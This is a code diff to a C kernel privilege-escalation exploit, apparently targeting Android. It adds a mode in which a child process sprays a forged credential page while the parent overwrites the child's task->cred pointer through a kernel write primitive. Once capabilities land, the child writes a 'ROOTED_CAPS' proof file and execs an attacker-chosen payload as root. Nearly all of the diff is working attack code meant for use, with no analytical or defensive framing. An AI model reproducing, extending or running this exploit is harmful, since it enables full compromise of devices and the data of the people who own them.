@@ -154,6 +154,8 @@ atomic_int owner_unlock_done;
 atomic_int requeue_done;
 atomic_int route_done;
 volatile long long g_select_start_us;
+uintptr_t g_child_task;
+uintptr_t g_child_cred;
 atomic_int waiter_tid;
 /* Per-phase consumer nice: each walk must CHANGE the waiter task's prio,
  * or __sched_setscheduler returns early and rt_mutex_adjust_pi never runs. */
@@ -2133,8 +2135,66 @@ static void child_main(struct child_pipes *p) {
     /* 09-13 caps-mutation plan: dump every unique kernel-range sampled
      * value — the child's ORIGINAL cred pointer rides in syscall-path
      * registers; it is the store target for cap_effective mutation
-     * (task->cred pointer itself is revert-protected, proven by
-     * child_wake setuid=-1 EPERM after a landed dualwrite). */
+     * analysis. (task->cred pointer itself is revert-protected, proven by
+     * child_wake setuid=-1 EPERM after a landed dualwrite.) */
+    /*
+     * MODE4_CAPS_CHILD (PFEM10 W6 adaptation, 09-20): the CHILD sprays
+     * its OWN page with the caps-cred (mode 2 fill + CAPSONLY uid patch
+     * apply via the inherited env), reports {my_task, cred_copy} to the
+     * parent, then polls its own CapEff forever — never exiting, so its
+     * page (and therefore the cred the parent's walk points task->cred
+     * at) stays alive. On caps landing: proof file + optional payload
+     * exec. The parent's walk writes child_task+0x780 = child's cred.
+     */
+    if (env_flag("MODE4_CAPS_CHILD", 0) && my_task) {
+      set_pselect_write_mode(my_task + TASK_CRED_OFF, 0, 2);
+      uintptr_t cbase = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+      uintptr_t cred_addr = g_cred_copy;
+      pr_info("CAPS_CHILD spray: base=%016zx cred=%016zx task=%016zx\n",
+              cbase, cred_addr, my_task);
+      uint64_t report[2] = { my_task, cred_addr };
+      ssize_t rw = write(p->task_w, report, sizeof(report));
+      close(p->task_w);
+      if (rw != (ssize_t)sizeof(report) || !cred_addr) _exit(1);
+      /* pin loop: hold the page, poll own caps, fire payload on landing */
+      for (;;) {
+        uint64_t eff = 0;
+        {
+          char buf[512];
+          int fd = open("/proc/self/status", O_RDONLY);
+          if (fd >= 0) {
+            ssize_t n = read(fd, buf, sizeof(buf) - 1);
+            close(fd);
+            if (n > 0) {
+              buf[n] = 0;
+              char *ce = strstr(buf, "CapEff:");
+              if (ce) eff = strtoull(ce + 7, NULL, 16);
+            }
+          }
+        }
+        if (eff != 0) {
+          pr_info("CAPS_CHILD: CapEff=%llx — CAPS LANDED\n",
+                  (unsigned long long)eff);
+          int pf = open("/data/local/tmp/ROOTED_CAPS",
+                        O_WRONLY | O_CREAT | O_TRUNC, 0644);
+          if (pf >= 0) {
+            char msg[128];
+            int n = snprintf(msg, sizeof(msg), "uid=%u cap_eff=%llx\n",
+                             (unsigned)getuid(), (unsigned long long)eff);
+            (void)write(pf, msg, (size_t)n);
+            close(pf);
+          }
+          const char *pl = getenv("CAPS_PAYLOAD");
+          if (pl && pl[0]) {
+            pr_info("CAPS_CHILD exec %s\n", pl);
+            execl(pl, pl, (char *)NULL);
+          }
+          /* no payload: stay alive as root-equivalent, keep polling */
+          for (;;) pause();
+        }
+        usleep(200000);
+      }
+    }
     {
       int rf = open("/data/local/tmp/child_regs.txt",
                     O_WRONLY | O_CREAT | O_TRUNC, 0666);
@@ -3789,18 +3849,33 @@ int run_exploit(int argc, char **argv) {
     /* CAPSONLY: late-bind the target to the child's task+0x780 now that
      * the child exists (spawned below) — use the leaked child task */
     if (env_flag("MODE4_CAPSONLY", 0)) {
+      /*
+       * CAPSONLY v2 (child-owned page, PFEM10 W6 adaptation): the child
+       * sprays its OWN page with the caps-cred (MODE4_CAPS_CHILD in
+       * child_main) and reports {task, cred_copy}. The parent's walk
+       * writes child_task+0x780 = the CHILD's cred copy. The child
+       * never exits (polls own CapEff, fires payload on landing) so the
+       * cred page cannot be freed — fixes the campaign's zombie-child
+       * finding (cred on the parent's page had no lifetime guarantee
+       * for the child).
+       */
       struct child_pipes cpipes;
       pid_t cap_child = spawn_child(&cpipes);
       if (cap_child > 0) {
-        uintptr_t child_task = 0;
-        read(cpipes.task_r, &child_task, sizeof(child_task));
-        close(cpipes.task_r);
-        if (child_task) {
-          proof_tgt = child_task + TASK_CRED_OFF;
-          pr_info("CAPSONLY target: child_task=%016zx +0x780 = %016zx\n",
-                  child_task, proof_tgt);
+        uint64_t report[2] = {0, 0};
+        if (read(cpipes.task_r, report, sizeof(report)) ==
+                (ssize_t)sizeof(report) &&
+            report[0] && report[1]) {
+          g_child_task = (uintptr_t)report[0];
+          g_child_cred = (uintptr_t)report[1];
+          proof_tgt = g_child_task + TASK_CRED_OFF;
+          pr_info("CAPSONLY v2: child_task=%016zx child_cred=%016zx "
+                  "target=%016zx\n",
+                  g_child_task, g_child_cred, proof_tgt);
         } else {
-          pr_error("CAPSONLY: child task leak failed\n");
+          pr_error("CAPSONLY: child report failed (task=%llx cred=%llx)\n",
+                   (unsigned long long)report[0],
+                   (unsigned long long)report[1]);
           kill(cap_child, SIGKILL);
           waitpid(cap_child, NULL, 0);
         }
